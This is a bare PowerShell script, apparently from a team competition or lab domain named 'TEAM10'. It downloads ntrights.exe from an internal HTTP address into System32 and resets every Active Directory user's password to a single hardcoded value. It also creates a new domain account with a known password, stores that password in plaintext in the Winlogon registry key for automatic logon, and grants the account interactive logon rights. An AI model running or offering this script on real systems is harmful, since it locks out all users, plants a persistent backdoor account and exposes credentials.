$DefaultUsername = "NewGuest14"
$DefaultPassword = "P@ssw0rd!"
$DomainName = "TEAM10"
$DomainUser = $DomainName + "\" + $DefaultUsername

curl -o C:\Windows\System32\ntrights.exe http://10.0.0.45:443/ntrights.exe
Get-ADUser -filter * | Set-ADAccountPassword -Reset -NewPassword(ConvertTo-SecureString "super_Secure_R!ght???" -asPlainText -Force)
New-ADUser $DefaultUsername -AccountPassword (ConvertTo-SecureString "P@ssw0rd!" -asPlainText -Force) -Enabled $True
$RegPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
Set-ItemProperty $RegPath "AutoAdminLogon" -Value "1" -type String 
Set-ItemProperty $RegPath "DefaultUsername" -Value "$DefaultUsername" -type String 
Set-ItemProperty $RegPath "DefaultPassword" -Value "$DefaultPassword" -type String
ntrights.exe +r "SeInteractiveLogonRight" -u $DomainUser
